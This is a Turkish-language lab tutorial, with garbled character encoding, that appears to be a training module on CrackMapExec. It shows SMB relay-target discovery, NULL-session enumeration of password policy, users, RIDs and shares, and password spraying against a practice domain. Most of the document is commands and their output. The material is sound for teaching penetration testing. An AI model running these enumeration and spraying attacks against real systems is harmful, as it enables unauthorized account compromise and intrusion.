AyrÄ±ca bir Windows 10, bir Windows Server ve bir Windows 7 host'u da gÃ¶rebiliyoruz. Windows sunucularÄ± genellikle ilginÃ§ verilerle dolu zengin hedeflerdir (paylaÅŸÄ±mlar, parolalar, web sitesi ve veritabanÄ± yedekleri, vb.) Hepsi Windows'un 64 bit sÃ¼rÃ¼mleridir, bu da bunlardan birinde Ã¶zel bir binary Ã§alÄ±ÅŸtÄ±rmamÄ±z gerektiÄŸinde yardÄ±mcÄ± olabilir.


### SMB Signing Devre DÄ±ÅŸÄ± Olan TÃ¼m HostlarÄ± Alma

CrackMapExec, SMB signing'in devre dÄ±ÅŸÄ± olduÄŸu tÃ¼m host'larÄ± Ã§Ä±kartma seÃ§eneÄŸine sahiptir. Bu seÃ§enek, SMBRelay saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in Impacket'ten [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) ile [Responder](https://github.com/lgandx/Responder) kullanmak istediÄŸimizde oldukÃ§a kullanÄ±ÅŸlÄ±dÄ±r.

```
crackmapexec smb 192.168.1.0/24 --gen-relay-list

relaylistOutputFilename.txt

SMB 192.168.1.101 445 DC2012A [*] Windows Server
2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True)
(SMBv1:True)

SMB 192.168.1.102 445 DC2012B [*] Windows Server
2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True)
(SMBv1:True)

SMB 192.168.1.111 445 SERVER1 [*] Windows Server
2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC)
(signing:False) (SMBv1:True)

SMB 192.168.1.117 445 WIN10DESK1 [*] WIN10DESK1 x64
(name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
<SNIP>

```

```
cat relaylistOutputFilename.txt
192.168.1.111
192.168.1.117
```

#### Signing Disabled - Host Enumeration

Bu komut, aÄŸÄ±nÄ±zdaki tÃ¼m SMB sunucularÄ±nÄ± tarar ve SMB imzalama (SMB signing) Ã¶zelliÄŸini devre dÄ±ÅŸÄ± bÄ±rakmÄ±ÅŸ olan sistemleri belirleyerek bunlarÄ± bir listeye kaydeder. Yani, sadece SMB imzalama devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ olan sunucular bu listeye dahil edilir.

**`--gen-relay-list`** parametresi, SMB Signing kapalÄ± olan makinelerin IP adreslerini Ã§Ä±karan bir "relay listesi" oluÅŸturur. Bu liste daha sonra **SMBRelay** saldÄ±rÄ±larÄ±nda kullanÄ±labilir. Yani, bu listeyi kullanarak, SMB imzalamayÄ± devre dÄ±ÅŸÄ± bÄ±rakmÄ±ÅŸ makinelerde SMB relay saldÄ±rÄ±sÄ± yapabilirsiniz.

Bu sayede, "Signing" (SMB signing devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ) makineleri hedef alÄ±rsÄ±nÄ±z, Ã§Ã¼nkÃ¼ bu makinelerde SMB iletiÅŸiminde Signing doÄŸrulamasÄ± yapÄ±lmaz ve dolayÄ±sÄ±yla relay saldÄ±rÄ±larÄ±na daha aÃ§Ä±ktÄ±rlar.


Bu modÃ¼lÃ¼n "Stealing Hashes" bÃ¶lÃ¼mÃ¼nde relaying konusunu ele alacaÄŸÄ±z.

AyrÄ±ca, bu blog yazÄ±sÄ±: [_Practical guide to NTLM Relaying in 2017_](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html) da okunmaya deÄŸer.


## Exploiting NULL/Anonymous Sessions

[NULL Session](https://en.wikipedia.org/wiki/Null_session), Windows tabanlÄ± bilgisayarlarda bir inter-process communication (IPC) aÄŸ servisine anonim bir baÄŸlantÄ±dÄ±r. Bu servis, named pipe baÄŸlantÄ±larÄ±na izin vermek Ã¼zere tasarlanmÄ±ÅŸ olsa da, saldÄ±rganlar tarafÄ±ndan sistem hakkÄ±nda uzaktan bilgi toplamak iÃ§in kullanÄ±labilir. 

Bir hedef, Ã¶zellikle bir domain controller  `NULL Session'a` karÅŸÄ± savunmasÄ±zsa, saldÄ±rganÄ±n geÃ§erli bir domain hesabÄ±na sahip olmadan aÅŸaÄŸÄ±daki gibi bilgileri toplamasÄ±na izin verebilir:

* Domain users ( --users )
* Domain groups ( --groups )
* Password policy ( --pass-pol )
* Share folders ( --shares )

 AÅŸaÄŸÄ±daki komutlarÄ± kullanarak bir domain controller Ã¼zerinde deneyelim:

### Enumerating the Password Policy
 
```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

SMB 10.129.203.121 445 DC01 [+] Dumping password
info for domain: INLANEFREIGHT

SMB 10.129.203.121 445 DC01 Minimum password
length: 7

SMB 10.129.203.121 445 DC01 Password history
length: 24

SMB 10.129.203.121 445 DC01 Maximum password age:
41 days 23 hours 53 minutes

SMB 10.129.203.121 445 DC01

SMB 10.129.203.121 445 DC01 Password Complexity
Flags: 000001

SMB 10.129.203.121 445 DC01 Domain Refuse
Password Change: 0

SMB 10.129.203.121 445 DC01 Domain Password
Store Cleartext: 0

SMB 10.129.203.121 445 DC01 Domain Password
Lockout Admins: 0

SMB 10.129.203.121 445 DC01 Domain Password No
Clear Change: 0

SMB 10.129.203.121 445 DC01 Domain Password No
Anon Change: 0

SMB 10.129.203.121 445 DC01 Domain Password
Complex: 1

SMB 10.129.203.121 445 DC01

SMB 10.129.203.121 445 DC01 Minimum password age:
1 day 4 minutes

SMB 10.129.203.121 445 DC01 Reset Account Lockout
Counter: 30 minutes

SMB 10.129.203.121 445 DC01 Locked Account
Duration: 30 minutes

SMB 10.129.203.121 445 DC01 Account Lockout
Threshold: None

SMB 10.129.203.121 445 DC01 Forced Log off Time:
Not Set
```

Bu listeyi dÄ±ÅŸa aktarmak istiyorsak, `--export [OUTPUT_FULL_FILE_PATH]` komutunu kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, mevcut yolu kullanmak iÃ§in `$(pwd)` kullanacaÄŸÄ±z:


### Exporting Password Policy

```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export $(pwd)/passpol.txt

...SNIP...
```

Export bir JSON dosyasÄ± olacaktÄ±r. DosyayÄ±, tek tÄ±rnaklarÄ± Ã§ift tÄ±rnaklarla deÄŸiÅŸtirmek iÃ§in `sed` komutunu kullanarak formatlayabiliriz ve ardÄ±ndan `jq` uygulamasÄ±nÄ± kullanarak gÃ¶rÃ¼ntÃ¼leyebiliriz.

### Formating exported file

```
sed -i "s/'/\"/g" passpol.txt
cat passpol.txt | jq
{
 "min_pass_len": 1,
 "pass_hist_len": 24,
 "max_pass_age": "41 days 23 hours 53 minutes ",
 "min_pass_age": "1 day 4 minutes ",
 "pass_prop": "000000",
 "rst_accnt_lock_counter": "30 minutes ",
 "lock_accnt_dur": "30 minutes ",
 "accnt_lock_thres": "None",
 "force_logoff_time": "Not Set"
}
```


### Enumerating Users

```
crackmapexec smb 10.129.203.121 -u '' -p '' --users --export $(pwd)/users.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-] Error enumerating
domain users using dc ip 10.129.203.121: NTLM needs domain\username and a
password
SMB 10.129.203.121 445 DC01 [*] Trying with SAMRPC
protocol
SMB 10.129.203.121 445 DC01 [+] Enumerated domain
user(s)
SMB 10.129.203.121 445 DC01
inlanefreight.htb\Guest Built-in account for
guest access to the computer/domain
SMB 10.129.203.121 445 DC01
inlanefreight.htb\carlos
SMB 10.129.203.121 445 DC01
inlanefreight.htb\grace
SMB 10.129.203.121 445 DC01
inlanefreight.htb\peter
SMB 10.129.203.121 445 DC01 
inlanefreight.htb\alina Account for testing HR
App. Password: HRApp123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\noemi
SMB 10.129.203.121 445 DC01
inlanefreight.htb\engels Service Account for
testing
SMB 10.129.203.121 445 DC01
inlanefreight.htb\kiosko
SMB 10.129.203.121 445 DC01
inlanefreight.htb\testaccount pwd: Testing123!
SMB 10.129.203.121 445 DC01
inlanefreight.htb\mathew
SMB 10.129.203.121 445 DC01
inlanefreight.htb\svc_mssql
```

Export edilen dosyayÄ±, tÃ¼m kullanÄ±cÄ±larÄ±n bir listesini almak iÃ§in kullanabiliriz; daha sonra bu listeyi kullanacaÄŸÄ±z.


### KullanÄ±cÄ± Listesini Ã‡Ä±karma

```
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
cat userslist.txt
Guest
carlos
grace
peter
alina
noemi
engels
kiosko
testaccount
mathew
svc_mssql
gmsa_adm
belkis
nicole
jorge
linda
shaun
diana
patrick
elieser

```

Burada, herhangi bir hesap olmadan tÃ¼m domain kullanÄ±cÄ±larÄ±nÄ± ve password policy'yi listeleyebiliriz. Bu yapÄ±landÄ±rma her zaman mevcut olmayabilir, ancak mevcutsa, domain'i ele geÃ§irme amacÄ±mÄ±za baÅŸlamak iÃ§in bize yardÄ±mcÄ± olacaktÄ±r.


### KullanÄ±cÄ±larÄ± rid bruteforce ile numaralandÄ±rma

Bir domainin kullanÄ±cÄ±larÄ±nÄ± belirlemek iÃ§in --rid-brute seÃ§eneÄŸi kullanÄ±labilir. Bu seÃ§enek Ã¶zellikle NULL Authentication'a sahip ancak belirli sorgu kÄ±sÄ±tlamalarÄ± olan bir domain ile uÄŸraÅŸÄ±rken kullanÄ±ÅŸlÄ±dÄ±r. Bu seÃ§eneÄŸi kullanarak, domain'deki kullanÄ±cÄ±larÄ± ve diÄŸer nesneleri numaralandÄ±rabiliriz.


### Enumerating Users with --rid-brute

```
crackmapexec smb 10.129.204.172 -u '' -p '' --rid-brute

SMB 10.129.204.172 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True)
(SMBv1:False)
SMB 10.129.204.172 445 DC01 [+] Brute forcing RIDs
SMB 10.129.204.172 445 DC01 498:
INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB 10.129.204.172 445 DC01 500:
INLANEFREIGHT\Administrator (SidTypeUser)
SMB 10.129.204.172 445 DC01 501:
INLANEFREIGHT\Guest (SidTypeUser)
SMB 10.129.204.172 445 DC01 502:
INLANEFREIGHT\krbtgt (SidTypeUser)
SMB 10.129.204.172 445 DC01 512:
INLANEFREIGHT\Domain Admins (SidTypeGroup)
SMB 10.129.204.172 445 DC01 513:
INLANEFREIGHT\Domain Users (SidTypeGroup)
...SNIP...
SMB 10.129.204.172 445 DC01 1853:
INLANEFREIGHT\abinateps (SidTypeUser)
SMB 10.129.204.172 445 DC01 1854:
INLANEFREIGHT\bustoges (SidTypeUser)
SMB 10.129.204.172 445 DC01 1855:
INLANEFREIGHT\nobseellace (SidTypeUser)
SMB 10.129.204.172 445 DC01 1856:
INLANEFREIGHT\wormithe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1857:
INLANEFREIGHT\therbanstook (SidTypeUser)
SMB 10.129.204.172 445 DC01 1858:
INLANEFREIGHT\sweend (SidTypeUser)
SMB 10.129.204.172 445 DC01 1859:
INLANEFREIGHT\voge1993 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1860:
INLANEFREIGHT\lach1973 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1861:
INLANEFREIGHT\coulart77 (SidTypeUser)
SMB 10.129.204.172 445 DC01 1862:
INLANEFREIGHT\whirds (SidTypeUser)
SMB 10.129.204.172 445 DC01 1863:
INLANEFREIGHT\sturhe (SidTypeUser)
SMB 10.129.204.172 445 DC01 1864:
INLANEFREIGHT\turittly (SidTypeUser)
...SNIP...
```


VarsayÄ±lan olarak, `--rid-brute`, RIDs deÄŸerlerini brute force ile 4000'e kadar enumerate eder. DavranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirmek iÃ§in `--rid-brute [MAX_RID]` kullanabiliriz.

**Not:** BazÄ± senaryolarda, NULL authentication ile RIDs brute force yapÄ±labilir.


### Enumerating Shares

PaylaÅŸÄ±lan klasÃ¶rler ile ilgili olarak, server konfigÃ¼rasyonuna baÄŸlÄ± olarak, herhangi bir hesap kullanmadan sadece `--shares` seÃ§eneÄŸini yazarak paylaÅŸÄ±mlara eriÅŸebiliriz. EÄŸer hata alÄ±rsak, paylaÅŸÄ±lan klasÃ¶rleri listelemek iÃ§in var olmayan rastgele bir isim veya guest/anonymous hesaplarÄ±nÄ± ÅŸifresiz olarak deneyebiliriz.

#### Enumerating Shares

```
crackmapexec smb 10.129.203.121 -u '' -p '' --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\:
SMB 10.129.203.121 445 DC01 [-] Error enumerating
shares: STATUS_ACCESS_DENIED
```


```
crackmapexec smb 10.129.203.121 -u guest -p '' --shares
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\guest:
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL
Logon server share
SMB 10.129.203.121 445 DC01 Users READ
```


TopladÄ±ÄŸÄ±mÄ±z bilgiler, domain iÃ§inde foothold elde etmek iÃ§in faydalÄ± olabilir. Password policy'deki bilgileri kullanarak bir Password Spraying saldÄ±rÄ±sÄ± dÃ¼zenleyebilir, ASREPRoasting gibi saldÄ±rÄ±lar gerÃ§ekleÅŸtirebilir veya aÃ§Ä±k bir share folder Ã¼zerinden gizli bilgilere eriÅŸim saÄŸlayabiliriz.

### Understanding Password Policy

Password Policy iÃ§in Microsoft belgeleri, Windows iÃ§in [password policy'lerine](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy) genel bir bakÄ±ÅŸ ve her policy ayarÄ± iÃ§in bilgi baÄŸlantÄ±larÄ± saÄŸlar.

Ã‡Ä±ktÄ±da gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z policy ayarlarÄ±ndan biri, 1 olarak ayarlanmÄ±ÅŸ olan Domain Password Complex'tir.[ Password must meet complexity requirements]([Password must meet complexity requirements - Windows 10 | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements)) politika ayarÄ±, parolalarÄ±n bir dizi gÃ¼Ã§lÃ¼ parola yÃ¶nergesini karÅŸÄ±lamasÄ± gerekip gerekmediÄŸini belirler. EtkinleÅŸtirildiÄŸinde, bu ayar parolalarÄ±n aÅŸaÄŸÄ±daki Ã¶lÃ§Ã¼tleri karÅŸÄ±lamasÄ±nÄ± gerektirir:

* Parolalar, kullanÄ±cÄ±nÄ±n `sAMAccountName` (kullanÄ±cÄ± hesabÄ± adÄ±) deÄŸerini veya `displayName`'in tamamÄ±nÄ± (tam ad deÄŸeri) iÃ§eremez. Her iki kontrol de bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harfe duyarlÄ± deÄŸildir.
* Parola aÅŸaÄŸÄ±daki kategorilerden Ã¼Ã§Ã¼nden karakter iÃ§ermelidir:
	* Avrupa dillerinin bÃ¼yÃ¼k harfleri (A'dan Z'ye, aksan iÅŸaretleri, Yunanca ve Kiril karakterleri ile birlikte)
	* Avrupa dillerinin kÃ¼Ã§Ã¼k harfleri (a'dan z'ye, diyezli, aksan iÅŸaretli, Yunanca ve Kiril karakterli)
	*  Taban 10 basamaklarÄ± (0 ile 9 arasÄ±)
	* AlfasayÄ±sal olmayan karakterler (Ã¶zel karakterler):  (`~!@#$%^&*_-+=|\(){} []:;"'<>,.?/) Euro veya Ä°ngiliz Sterlini gibi para birimi sembolleri bu policy ayarÄ± iÃ§in Ã¶zel karakter olarak sayÄ±lmaz.
	* Alfabetik karakter olarak sÄ±nÄ±flandÄ±rÄ±lan ancak bÃ¼yÃ¼k veya kÃ¼Ã§Ã¼k harf olmayan herhangi bir Unicode karakteri. Bu grup Asya dillerindeki Unicode karakterlerini iÃ§erir.

Not: Parolalar deÄŸiÅŸtirildiÄŸinde veya oluÅŸturulduÄŸunda karmaÅŸÄ±klÄ±k gereksinimleri uygulanÄ±r.

Password Spraying saldÄ±rÄ±sÄ± iÃ§in numaralandÄ±rÄ±lmasÄ± gereken bir diÄŸer Ã¶nemli parametre de `Account Lockout Threshold`'dur (Hesap Kilitleme EÅŸiÄŸi) . Bu policy ayarÄ±, bir kullanÄ±cÄ± hesabÄ±nÄ±n kilitlenmesine neden olacak baÅŸarÄ±sÄ±z oturum aÃ§ma giriÅŸimlerinin sayÄ±sÄ±nÄ± belirler. Kilitli bir hesap, siz sÄ±fÄ±rlayana kadar veya `CrackMapExec` Ã§Ä±ktÄ±sÄ±nda da gÃ¶rÃ¼ntÃ¼lenen Hesap Kilitleme SÃ¼resi policy ayarÄ± tarafÄ±ndan belirtilen dakika sayÄ±sÄ± sona erene kadar kullanÄ±lamaz.

Bu password politikasÄ±na gÃ¶re, herhangi bir **hesap kilitleme politikasÄ± (lockout policy)** bulunmamaktadÄ±r. Bu nedenle, istediÄŸimiz kadar parola denemesi yapabiliriz ve hesaplar kilitlenmez.

Bu politikaya gÃ¶re, parolalar **en az yedi karakter** uzunluÄŸunda olmalÄ± ve **en az bir bÃ¼yÃ¼k harf, bir kÃ¼Ã§Ã¼k harf ve bir Ã¶zel karakter** iÃ§ermelidir.

Not: CrackMapExec, varsa `Password Setting Objects`'i (PSO) deÄŸil, yalnÄ±zca `Default Password Policy`'yi kontrol eder.


Bu bÃ¶lÃ¼mde, **`NULL session authentication`** ile yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir **domain**'den nasÄ±l bilgi alacaÄŸÄ±mÄ±zÄ± Ã¶ÄŸrendik.

Bir sonraki bÃ¶lÃ¼mde, bu bilgileri kullanarak **kimlik bilgilerini nasÄ±l tespit edeceÄŸimizi** Ã¶ÄŸreneceÄŸiz.


### Password Spraying

NULL Session aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanan kullanÄ±cÄ±larÄ±n bir listesini bulduk. Åimdi domain'de bir yer edinmek iÃ§in geÃ§erli bir ÅŸifre bulmamÄ±z gerekiyor. Elimizde uygun bir kullanÄ±cÄ± listesi yoksa veya hedef `NULL Session` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z deÄŸilse, geÃ§erli kullanÄ±cÄ± adlarÄ±nÄ± bulmak iÃ§in OSINT (yani `LinkedIn`'de avlanma), geniÅŸ bir kullanÄ±cÄ± adÄ± listesi ve `Kerbrute` ile brute-forcing, fiziksel keÅŸif vb. gibi baÅŸka bir yola ihtiyacÄ±mÄ±z olacaktÄ±r. Bu bÃ¶lÃ¼mde, bir kullanÄ±cÄ± adÄ± listesine sahip olduÄŸumuzda bir dizi hedefe karÅŸÄ± kimlik doÄŸrulamayÄ± test ederek geÃ§erli bir kimlik bilgisi kÃ¼mesini nasÄ±l bulacaÄŸÄ±mÄ±zÄ± Ã¶ÄŸreneceÄŸiz.

### Creating a Password List

Bu kullanÄ±cÄ±larÄ±n ÅŸifrelerini bilmiyoruz, ancak bildiÄŸimiz ÅŸey ÅŸifre politikasÄ±dÄ±r. `Welcome1` ve `Password123` gibi yaygÄ±n parolalardan oluÅŸan Ã¶zel bir sÃ¶zcÃ¼k listesi, sonunda yÄ±l olan geÃ§erli ay, ÅŸirket adÄ± veya domain adÄ± oluÅŸturabilir ve farklÄ± mutasyonlar uygulayabiliriz.  Parola olarak domain'in bÃ¼yÃ¼k harf, sayÄ± ve sonunda Ã¼nlem iÅŸareti ile kullanalÄ±m:

### Password List & User List

```
cat passwords.txt
Inlanefreight01!
Inlanefreight02!
Inlanefreight03!
```


```
cat users.txt

noemi
david
carlos
grace
peter
robert
administrator
```


Åimdi **protocol** ve **target** seÃ§memiz ve `-u` seÃ§eneÄŸini kullanarak **username(ler)** veya **username iÃ§eren dosya(lar)** saÄŸlamamÄ±z, `-p` seÃ§eneÄŸini kullanarak ise **password(ler)** veya **password iÃ§eren dosya(lar)** belirtmemiz gerekiyor. **SMB** **protocol**'Ã¼nÃ¼ kullanarak bazÄ± Ã¶rneklere bakalÄ±m:


### Bir Dosya Ä°Ã§eren Username'ler ile Tek Bir Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```




### Bir Liste Ä°Ã§eren Username'ler ile Tek Bir Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p
Inlanefreight01!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```



### Bir Liste Ä°Ã§eren Username'ler ile Ä°ki Password Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
Inlanefreight01! Inlanefreight02!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
```

Ã‡Ä±ktÄ±dan da gÃ¶rebileceÄŸimiz gibi, yeÅŸil renkle temsil edilen ve `[+]` Ã§Ä±ktÄ±sÄ±yla baÅŸlayan domain'de yalnÄ±zca bir geÃ§erli kimlik bilgisi bulduk. Bununla birlikte, tÃ¼m hesaplar test edilmemiÅŸtir. Ä°lk geÃ§erli kimlik bilgileri bulunduktan sonra, `CME` `password spraying` iÅŸlemini `durdurur` Ã§Ã¼nkÃ¼ bu genellikle domain numaralandÄ±rmasÄ±nÄ±n geri kalanÄ± iÃ§in yeterlidir. Bazen, ayrÄ±calÄ±klÄ± bir hesap bulabileceÄŸimiz iÃ§in tÃ¼m hesaplarÄ± test etmek daha iyidir. Bu amaÃ§la, CME `--continue-on-success` seÃ§eneÄŸi ile birlikte gelir:


### Continue on Success

```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
Inlanefreight01! Inlanefreight02! --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\grace:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!

```

AyrÄ±ca, her kullanÄ±cÄ± iÃ§in tÃ¼m parolalarÄ± test edecek olan passwords.txt gibi bir dosya ile bir parola listesi saÄŸlayabiliriz, bu password spraying iÃ§in yararlÄ± olabilir, ancak bir Hesap Kilitleme politikasÄ± ayarlandÄ±ÄŸÄ±nda Ã§ok fazla deÄŸil. Hesap Kilitleme konusunu bu bÃ¶lÃ¼mÃ¼n ilerleyen kÄ±sÄ±mlarÄ±nda ele alacaÄŸÄ±z.

Hesap kilitlemenin 5 olarak ayarlandÄ±ÄŸÄ±nÄ± biliyorsak, bir hesabÄ±n kilitlenmesini Ã¶nlemek iÃ§in 2 veya 3 paroladan oluÅŸan bir parola listesi oluÅŸturabiliriz.


### Bir Liste Ä°Ã§eren Username'ler ile Bir Password List Kullanarak Password Attack

```
crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\noemi:Inlanefreight03! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\david:Inlanefreight03! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!
```


### Bir User ile Bir Password'Ã¼n EÅŸleÅŸmesini Bir Wordlist Kullanarak Kontrol Etme

CME'nin bir baÅŸka harika Ã¶zelliÄŸi de, her kullanÄ±cÄ±nÄ±n parolasÄ±nÄ± biliyorsak ve hala geÃ§erli olup olmadÄ±klarÄ±nÄ± test etmek istiyorsak. Bunun iÃ§in `--no-bruteforce` seÃ§eneÄŸini kullanÄ±n. Bu seÃ§enek 1. kullanÄ±cÄ±yÄ± 1. parola ile, 2. kullanÄ±cÄ±yÄ± 2. parola ile ve bu ÅŸekilde kullanacaktÄ±r.

### Bruteforcing Devre dÄ±ÅŸÄ± bÄ±rak

```
cat userfound.txt
grace
carlos
```

```
cat passfound.txt
Inlanefreight01!
Inlanefreight02!
```

```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\carlos:Inlanefreight02!
```


### Testing Local Accounts

Domain hesabÄ± yerine bir `lokal` hesabÄ± test etmek istersek, CrackMapExec'te                  `--local-auth` seÃ§eneÄŸini kullanabiliriz:

### Lokal Hesap Nedir?

- **Lokal hesap**, bir bilgisayara **yalnÄ±zca o bilgisayarda** bulunan kullanÄ±cÄ± hesabÄ±dÄ±r. Bu hesap, bir **domain**  yÃ¶netimi altÄ±nda deÄŸildir.
- Ã–rneÄŸin, bir Windows bilgisayarda "`Administrator`" veya baÅŸka bir local kullanÄ±cÄ± hesabÄ±, **lokal hesap**tÄ±r.
- Bu hesaplar, sadece o makinede geÃ§erli kullanÄ±cÄ± adÄ± ve ÅŸifreye sahiptir.

**Domain hesabÄ±** ise bir **Active Directory (AD)** ortamÄ±nda tanÄ±mlanmÄ±ÅŸ kullanÄ±cÄ± hesabÄ±dÄ±r ve domaindeki herhangi bir bilgisayarda kullanÄ±labilir.


### Password Spraying Local Accounts

```
crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --localauth

SMB 192.168.133.157 445 WIN10 [*] Windows 10.0
Build 22000 x64 (name:WIN10) (domain:WIN10) (signing:False) (SMBv1:True)
SMB 192.168.133.157 445 WIN10 [+]
